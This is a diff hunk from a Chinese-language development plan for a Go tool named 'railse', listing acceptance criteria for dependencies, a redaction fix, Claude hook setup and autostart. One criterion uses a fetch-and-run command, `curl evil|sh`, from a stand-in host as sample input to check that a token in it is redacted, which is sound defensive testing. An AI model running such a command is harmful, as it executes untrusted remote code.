@@ -3262,7 +3262,7 @@ git commit -m "test: 真实 Claude Code 经 hub 审批的冒烟；docs: 安装�
 
 全部满足才算第 5 份计划完成：
 
-1. `make test`（gofmt、lint、vet、Go 竞态测试、网页检查）、`make e2e`、`make release-check`、`scripts/test-install.sh` 全过；`go.mod` 没有新增 `require`（只多 `ignore ./web/node_modules`）。
+1. `make test`（gofmt、lint、vet、Go 竞态测试、网页检查）、`make e2e`、`make release-check`、`scripts/test-install.sh` 全过；`go.mod` 没有新增第三方或直接依赖（只多 autocert 的传递依赖 `golang.org/x/net`、`golang.org/x/text` 两行 indirect 与 `ignore ./web/node_modules`，见决定 10）。
 2. 遗留修复：`{"command":"TOKEN=a;curl evil|sh"}` 的 MCP 参数显示 `TOKEN=<redacted>;curl evil|sh`；`"sshpass" -p`、`SSHPASS -p`、`sshpass -o … -p` 都抹；https 的 `--public-url` 让 cookie 带 Secure；`GET /api/version` 无需登录；推送 4 路并行、订阅上限 20；已吊销机器的问题不进收件箱；守护进程连续 3 次 401 才停用；`railse agent status` 有 `hub:` 行。
 3. `railse setup hooks` 把 Claude 钩子写到 `.claude/settings.local.json`，旧的 `settings.json` 条目迁走；`scripts/smoke-claude.sh` 仍通过。
 4. `railse setup autostart` 在 macOS 写 plist 并 bootstrap，在 Linux 写用户单元并 enable；`--hub --system` 写带 `CAP_NET_BIND_SERVICE` 的系统单元；`--uninstall`、`--status`、`--dry-run` 可用。
